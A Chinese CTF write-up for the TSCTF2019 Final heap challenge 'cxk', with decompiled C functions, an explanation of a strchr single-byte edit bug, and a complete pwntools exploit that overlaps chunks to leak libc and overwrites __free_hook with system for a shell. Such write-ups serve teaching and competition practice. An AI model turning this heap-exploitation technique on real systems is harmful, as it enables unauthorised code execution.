---
title: cxk
categories:
- TSCTF2019
---
# TSCTF2019 Final cxk

## 前言

第一次AWD，后来才知道一个题可以放多个漏洞，比赛的时候自己因为代码太多理不清自己乱掉了，心态真的很重要

## 程序逻辑

这里有两个结构很类似的结构体，一个是AV，另一个是Letter，因为太相似了，只是内部的名字和含义不太一样，这里就写一个好了。

一个AV里面包括des_chunk_addr(描述的堆块指针)，av_number，下一个av_chunk，上一个av_chunk，，和des_size。

Letter里面把description换成了reason，即包含reason_addr和reason_size。

![struct](./1.jpg)

程序有非常多功能...这里只介绍我用到的地方，主menu的1和2，menu2的功能1(AddAV)

![menu](./2.jpg)

![menu1](./3.jpg)

![menu2](./4.jpg)

先看menu2的AddAv，最开始prev_av即0x6030f8位置的值为0x6030e0，所以第一次分配的时候check_addr的next_chunk和prev_chunk为0x6030e0。prev_av->next_chunk即0x6030f0的值写入了第一次分配的check_addr，这个check_addr同时被写入到0x6030f8，自此0x6030f0就作为链表的第一个节点，0x6030f8作为最后一个有效节点(其next_chunk为0x6030e0)，故遍历直到0x6030e0作为结束。

这里分配AV的时候先读av_number，不存在已有的av_number方可分配，read_int是按照16进制转换输入，description的size限制在0x400内，每次先分配description，再分配固定大小为0x28的check_chunk。(最多分配48个AV)

下面是程序的第一个主功能(围绕Letter展开)

Letter的结构和AV很像，des改成reason理解就好。SendLawyerLetter可以当成Malloc，每次分配一个av_number的Letter前需要先有一个AV，链表的首节点改为0x603130，最后一个有效节点为0x603138，尾节点为0x603120。(这里有个check不管它)

```c
unsigned __int64 SendLawerLetter()
{
  signed int found; // [rsp+8h] [rbp-48h]
  signed int v2; // [rsp+Ch] [rbp-44h]
  __int64 av_number; // [rsp+10h] [rbp-40h]
  __int64 buf; // [rsp+18h] [rbp-38h]
  Av *i; // [rsp+20h] [rbp-30h]
  Av *j; // [rsp+28h] [rbp-28h]
  size_t size; // [rsp+30h] [rbp-20h]
  void *reason_addr; // [rsp+38h] [rbp-18h]
  Av *av_addr; // [rsp+40h] [rbp-10h]
  unsigned __int64 canary; // [rsp+48h] [rbp-8h]

  canary = __readfsqword(0x28u);
  av_number = 0LL;
  size = 0LL;
  reason_addr = 0LL;
  i = 0LL;
  j = 0LL;
  found = 0;
  v2 = 0;
  buf = 0LL;
  if ( dword_6030CC <= 48 )
  {
    if ( dword_6030D0 > 0 )
    {
      write(1, "Please input av number:", 0x17uLL);
      __isoc99_scanf("%lld", &av_number);
      for ( i = (Av *)qword_6030F0; i != (Av *)&unk_6030E0; i = (Av *)i->next_chunk )
      {
        if ( i->av_number == av_number )
        {
          found = 1;
          break;
        }
      }                                         // 每个Letter需要对应先有一个AV
      if ( found )
      {
        for ( j = (Av *)qword_603130; j != (Av *)&unk_603120; j = (Av *)j->next_chunk )
        {
          if ( j->av_number == av_number )
          {
            v2 = 1;
            break;
          }
        }
        if ( v2 )
        {
          puts("You play CTF just like CXK!");
        }
        else
        {
          write(1, "Please input the size of reason:", 0x20uLL);
          size = (signed int)read_number();
          if ( (signed __int64)size > 0 && (signed __int64)size <= 0x400 )
          {
            reason_addr = malloc(size);
            write(1, "Reason:", 7uLL);
            get_input(0LL, (__int64)reason_addr, size);
            av_addr = (Av *)malloc(0x28uLL);
            write(1, "check:", 6uLL);
            buf = (unsigned __int16)av_addr & 0xFFF;
            write(1, &buf, 2uLL);
            write(1, "\n", 1uLL);
            av_addr->av_number = av_number;
            av_addr->des_chunk_addr = (__int64)reason_addr;
            LODWORD(av_addr->des_size) = size;
            av_addr->next_chunk = (__int64)&unk_603120;
            av_addr->prev_chunk = (__int64)qword_603138;
            qword_603138->next_chunk = (__int64)av_addr;
            qword_603138 = av_addr;
            ++dword_6030CC;                     // total chunk
          }
          else
          {
            puts("You play CTF just like CXK!");
          }
        }
      }
      else
      {
        puts("You play CTF just like CXK!");
      }
    }
    else
    {
      puts("You play CTF just like CXK!");
    }
  }
  else
  {
    puts("Too much lawyer letter!");
  }
  return __readfsqword(0x28u) ^ canary;
}
```



![set](./5.jpg)

```c
unsigned __int64 AddAV()
{
  signed int is_exist; // [rsp+4h] [rbp-3Ch]
  __int64 av_number; // [rsp+8h] [rbp-38h]
  __int64 buf; // [rsp+10h] [rbp-30h]
  Av *i; // [rsp+18h] [rbp-28h]
  size_t size; // [rsp+20h] [rbp-20h]
  void *des_addr; // [rsp+28h] [rbp-18h]
  Av *check_addr; // [rsp+30h] [rbp-10h]
  unsigned __int64 v8; // [rsp+38h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  av_number = 0LL;
  size = 0LL;
  des_addr = 0LL;
  i = 0LL;
  is_exist = 0;
  buf = 0LL;
  if ( dword_6030D0 <= 48 )
  {
    write(1, "Please input av number:", 0x17uLL);
    __isoc99_scanf("%lld", &av_number);
    for ( i = (Av *)qword_6030F0; i != (Av *)&unk_6030E0; i = (Av *)i->next_chunk )
    {
      if ( i->av_number == av_number )
      {
        is_exist = 1;
        break;
      }
    }
    if ( is_exist )
    {
      puts("You play CTF just like CXK!");
    }
    else
    {
      write(1, "Please input the size of description:", 0x25uLL);
      size = (signed int)read_number();
      if ( (signed __int64)size > 0 && (signed __int64)size <= 0x400 )
      {
        des_addr = malloc(size);
        write(1, "Description:", 0xCuLL);
        get_input(0LL, (__int64)des_addr, size);
        check_addr = (Av *)malloc(0x28uLL);
        write(1, "check:", 6uLL);
        buf = (unsigned __int16)check_addr & 0xFFF;
        write(1, &buf, 2uLL);                   // ？？？
        write(1, "\n", 1uLL);
        check_addr->av_number = av_number;
        check_addr->des_chunk_addr = (__int64)des_addr;
        LODWORD(check_addr->des_size) = size;
        check_addr->next_chunk = (__int64)&unk_6030E0;
        check_addr->prev_chunk = (__int64)prev_av;
        prev_av->next_chunk = (__int64)check_addr;
        prev_av = check_addr;
        ++dword_6030D0;
      }
      else
      {
        puts("You play CTF just like CXK!");
      }
    }
  }
  else
  {
    puts("Too much video!");
  }
  return __readfsqword(0x28u) ^ v8;
}
```

EditStatement类似Edit函数，这里的strchr函数在des_chunk中寻找一个用户的字符，改为新字符，这里存在漏洞。比如我们分配的des_chunk大小为0x18，数据填充'a'*0x18，那么我们old_chr为'\x31'，new_chr为'\x91'即可将与des_chunk相邻的letter_chunk的size改为0x61，同理可以往后继续改，只要构造数据得当，可以溢出很远。

```c
unsigned __int64 EditStatment()
{
  signed int is_exist; // [rsp+0h] [rbp-40h]
  __int64 av_number; // [rsp+8h] [rbp-38h]
  Av *v3; // [rsp+10h] [rbp-30h]
  char *character_index; // [rsp+18h] [rbp-28h]
  char old_charcter; // [rsp+20h] [rbp-20h]
  char new_character; // [rsp+30h] [rbp-10h]
  unsigned __int64 v7; // [rsp+38h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  av_number = 0LL;
  v3 = 0LL;
  is_exist = 0;
  if ( dword_6030CC > 0 )
  {
    puts("The Judge is too stingy that you only allowed to change a character a time");
    write(1, "Please input the av_number for statement you want to change:", 0x3CuLL);
    __isoc99_scanf("%lld", &av_number);
    v3 = (Av *)qword_603130;
    while ( v3->av_number != av_number )
    {
      v3 = (Av *)v3->next_chunk;
      if ( v3 == (Av *)&unk_603120 )
        goto LABEL_7;
    }
    is_exist = 1;
LABEL_7:
    if ( is_exist )
    {
      write(1, "Please input the old character:", 0x1FuLL);
      if ( (signed int)read(0, &old_charcter, 2uLL) <= 0 )
      {
        puts("You play CTF just like CXK!");
        exit(1);
      }
      write(1, "Please input the new character:", 0x1FuLL);
      if ( (signed int)read(0, &new_character, 2uLL) <= 0 )
      {
        puts("You play CTF just like CXK!");
        exit(1);
      }
      character_index = strchr((const char *)v3->des_chunk_addr, old_charcter);
      *character_index = new_character;
    }
    else
    {
      puts("You play CTF just like CXK!");
    }
  }
  else
  {
    puts("You play CTF just like CXK!");
  }
  return __readfsqword(0x28u) ^ v7;
}
```

Revoke函数类似Free，先free掉des_chunk再free掉letter_chunk，没有清空数据

```c
unsigned __int64 Revoke()
{
  signed int is_exist; // [rsp+4h] [rbp-1Ch]
  __int64 av_number; // [rsp+8h] [rbp-18h]
  Av *ptr; // [rsp+10h] [rbp-10h]
  unsigned __int64 canary; // [rsp+18h] [rbp-8h]

  canary = __readfsqword(0x28u);
  av_number = 0LL;
  ptr = 0LL;
  is_exist = 0;
  if ( dword_6030CC > 0 )
  {
    write(1, "Please input the av_number for lawyer letter you want to revoke:", 0x40uLL);
    __isoc99_scanf("%lld", &av_number);
    ptr = (Av *)qword_603130;
    while ( ptr->av_number != av_number )
    {
      ptr = (Av *)ptr->next_chunk;
      if ( ptr == (Av *)&unk_603120 )
        goto LABEL_7;
    }
    is_exist = 1;
LABEL_7:
    if ( is_exist )
    {
      *(_QWORD *)(ptr->prev_chunk + 16) = ptr->next_chunk;
      *(_QWORD *)(ptr->next_chunk + 24) = ptr->prev_chunk;
      free((void *)ptr->des_chunk_addr);
      free(ptr);
      --dword_6030CC;
    }
    else
    {
      puts("You play CTF just like CXK!");
    }
  }
  else
  {
    puts("You play CTF just like CXK!");
  }
  return __readfsqword(0x28u) ^ canary;
}
```

ShowLawyerLetter类似Puts函数

```c
unsigned __int64 ShowLawyerLetter()
{
  signed int is_exist; // [rsp+4h] [rbp-1Ch]
  __int64 av_number; // [rsp+8h] [rbp-18h]
  Av *v3; // [rsp+10h] [rbp-10h]
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  av_number = 0LL;
  v3 = 0LL;
  is_exist = 0;
  if ( dword_6030CC > 0 )
  {
    write(1, "Please input the av_number for lawyer letter you want to see:", 0x3DuLL);
    __isoc99_scanf("%lld", &av_number);
    v3 = (Av *)qword_603130;
    while ( v3->av_number != av_number )
    {
      v3 = (Av *)v3->next_chunk;
      if ( v3 == (Av *)&unk_603120 )
        goto LABEL_7;
    }
    is_exist = 1;
LABEL_7:
    if ( is_exist )
    {
      write(1, "Reason:", 7uLL);
      write(1, (const void *)v3->des_chunk_addr, SLODWORD(v3->des_size));
      write(1, "\n", 1uLL);
    }
    else
    {
      puts("You play CTF just like CXK!");
    }
  }
  else
  {
    puts("You play CTF just like CXK!");
  }
  return __readfsqword(0x28u) ^ v4;
}
```

## 漏洞利用

先分配一些AV(0x30)和Letter(0x70)，再分配两个0x20的chunk并free(为之后的get shell准备)利用刚才strchr的漏洞将每个des_chunk的相邻letter_chunk的size改为0xa0(0x70+0x30，其下一个chunk的prev_in_use需要为1)，释放7个伪造的块，第8次释放的时候得到了unsorted bin里的chunk。

分配一个0x28大小的chunk，这时候先分配des_chunk后分配letter_chunk，des_chunk里的fd和bk都为main_arena+88，ShowLawyerLetter可以泄露libc。

现在注意我们刚刚释放了2个0x20大小的chunk，它们都进了tcache[0x20]。而我们刚刚通过Unsorted bin分配得到的那个0x28的块恰和0x1ddd4e0相邻，我们用strchr的漏洞多次edit即可修改其fd为我们的__free_hook，改为system_addr，最后释放一个'/bin/sh\x00'的块即可得到shell。

![attack](./6.jpg)

## exp.py

```py
#coding=utf-8
from pwn import *
context.update(arch='amd64',os='linux',log_level="DEBUG")
context.terminal = ['tmux','split','-h']
debug = 1
gadgets = [0x4f2c5,0x4f322,0x10a38c]
libc = ELF('./libc.so.6')
if debug:
    p = process('./cxk')
    #gdb.attach(p)
else:
    p = remote('172.16.10.2',9999)

def InputName():
    p.recvuntil('Please input your name:')
    p.sendline('xmzyshypnc')

def AddAv(av_number,des_size,content):
    p.recvuntil('Choice:')
    p.sendline('2')
    p.recvuntil('Choice:')
    p.sendline('1')
    p.recvuntil('Please input av number:')
    p.sendline(str(av_number))
    p.recvuntil('Please input the size of description:')
    p.sendline(str(des_size))
    p.recvuntil('Description:')
    p.sendline(content)

def SendLetter(av_number,reason_size,reason):
    p.recvuntil('Choice:')
    p.sendline('1')
    p.recvuntil('Choice:')
    p.sendline('1')
    p.recvuntil('Please input av number:')
    p.sendline(str(av_number))
    p.recvuntil('Please input the size of reason:')
    p.sendline(str(reason_size))
    p.recvuntil('Reason:')
    p.send(reason)

def BeginCourtSession(av_number):
    p.recvuntil('Choice:')
    p.sendline('1')
    p.recvuntil('Choice:')
    p.sendline('2')
    p.recvuntil('Please input av number:')
    p.sendline(str(av_number))

def EditStatement(av_number,old_chr,new_chr):
    p.recvuntil('Choice:')
    p.sendline('1')
    p.recvuntil('Choice:')
    p.sendline('3')
    p.recvuntil('Please input the av_number for statement you want to change:')
    p.sendline(str(av_number))
    p.recvuntil('Please input the old character:')
    p.sendline(old_chr)
    p.recvuntil('Please input the new character:')
    p.sendline(new_chr)

def Revoke(av_number):
    p.recvuntil('Choice:')
    p.sendline('1')
    p.recvuntil('Choice:')
    p.sendline('4')
    p.recvuntil('Please input the av_number for lawyer letter you want to revoke:')
    p.sendline(str(av_number))

def ShowLetter(av_number):
    p.recvuntil('Choice:')
    p.sendline('1')
    p.recvuntil('Choice:')
    p.sendline('5')
    p.recvuntil('Please input the av_number for lawyer letter you want to see:')
    p.sendline(str(av_number))



def EditAv(av_number,content):
    p.recvuntil('Choice:')
    p.sendline('2')
    p.recvuntil('Choice:')
    p.sendline('2')
    p.recvuntil('Please input av number:')
    p.sendline(str(av_number))
    p.recvuntil('New Description:')
    p.send(content)

def DeleteAv(av_number):
    p.recvuntil('Choice:')
    p.sendline('2')
    p.recvuntil('Choice:')
    p.sendline('3')
    p.recvuntil('Please input av number:')
    p.sendline(str(av_number))

def PlayAv(av_number):
    p.recvuntil('Choice:')
    p.sendline('2')
    p.recvuntil('Choice:')
    p.sendline('4')
    p.recvuntil('Please input av number:')
    p.sendline(str(av_number))

def exp():
    #leak libc
    InputName()
    malloc_num = 36
    for i in range(malloc_num):
        AddAv(i,20,'a')
    for i in range(8):
        SendLetter(i,68,'a'*0x67+'\n')
    SendLetter(8,18,'b\n')
    SendLetter(9,18,'b\n')
    for i in range(7):
        EditStatement(i,'\x00','\x10')
        EditStatement(i,'\x31','\xa1')
        Revoke(i)
    Revoke(8)
    Revoke(9)
    EditStatement(7,'\x00','\x10')
    EditStatement(7,'\x31','\xa1')


    Revoke(7)

    #get unsorted bin
    SendLetter(10,0x28,'a'*6+'\n')#overlapping chunk
    ShowLetter(10)

    p.recvuntil('a'*6+'\x00\x00')
    libc_base = u64(p.recvn(8)) - 224 - 0x3ebc50
    log.success('libc base => ' + hex(libc_base))
    malloc_hook = libc_base + libc.symbols['__free_hook']
    fake_chunk = malloc_hook - 0x23
    shell_addr = libc_base + libc.symbols['system']


    #get shell
    for i in range(14):
        EditStatement(10,'\x00','\x31')
    for i in range(14):
        EditStatement(10,'\x00','\x01')
    for i in range(8):
        EditStatement(10,'\x00',p64(malloc_hook)[i])
    #set to null
    #for i in range(14):
    #    EditStatement(10,'\x01','\x00')
    SendLetter(11,18,'a\n')
    SendLetter(12,18,'/bin/sh\x00\n')

    SendLetter(13,18,p64(shell_addr)+'\n')
    gdb.attach(p)
    Revoke(12)
    #SendLetter(11,0x48,'a'*0x20+p64(0x18)+p64(0x21)+p64(fake_chunk)+'\n')




    '''
    for i in range(10,24):
        #if i == 18
        SendLetter(i,68,'a'*0x67+'\n')#10

    for i in range(10,17):
        EditStatement(i,'\x00','\x10')
        EditStatement(i,'\x31','\x41')
        EditStatement(i,'\x00','\x01')
        Revoke(i)
    EditStatement(17,'\x00','\x10')
    EditStatement(17,'\x31','\x41')
    EditStatement(17,'\x00','\x01')
    #Revoke(19)
    #Revoke(18)
    Revoke(17)



    gdb.attach(p)
    SendLetter(24,130,'a\n')
    SendLetter(25,130,'a\n')
    #
    SendLetter(26,100,'\x00'*0x20+p64(0x68)+p64(0x71)+p64(fake_chunk)+'\n')

    for i in range(25,32):
        SendLetter(i,68,'a\n')

    Revoke(25)
    SendLetter(32,10,'a\n')

    SendLetter(33,60,'a\n')

    SendLetter(26,68,'a\n')


    '''

    p.interactive()

exp()
```

